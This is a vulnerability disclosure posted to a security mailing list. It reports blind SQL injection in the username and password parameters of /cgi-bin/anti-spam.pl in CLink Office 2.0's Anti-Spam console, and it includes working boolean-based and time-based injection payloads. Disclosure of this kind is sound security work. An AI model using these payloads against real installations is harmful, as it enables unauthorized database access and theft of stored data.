Subject: [FD] Disclosing Vulnerability of CLink Office 2.0

Dear Sir/Madam,

I would like to submit a vulnerability found on CLink Office 2.0. I had
contacted the vendor 60 days before but in vain.

# Exploit Title: Multiple blind SQL injection vulnerabilities in in CLink
Office 2.0 Anti-Spam management console

# Date: 30 Mar 2022

# Exploit Author: Erwin Chan, Stephen Tsoi

# Vendor Homepage: https://www.communilink.net/

# Softwar: CLink Office

# Version: 2.0

# Tested on: CLink Office 2.0 Anti-Spam management console

Vulnerability details below:

Affected URL: /cgi-bin/anti-spam.pl
Affected Parameter: username, password
Payload example:
- boolean-based blind SQLi
* ' AND 1234=(SELECT (CASE WHEN (TRUE) THEN 1234 ELSE (SELECT 1111 UNION
SELECT 2222) END))-- LMgx*
*' AND 1234=(SELECT (CASE WHEN (FALSE) THEN 1234 ELSE (SELECT 1111 UNION
SELECT 2222) END))-- LMgx*
- time-based blind SQLi
*' OR SLEEP(5)-- LMgx*

As a result, we were able to dump database data on application. I recommend
development team to perform input sanitization on affected parameters.
Please lets me know if you have any questions. Thanks.
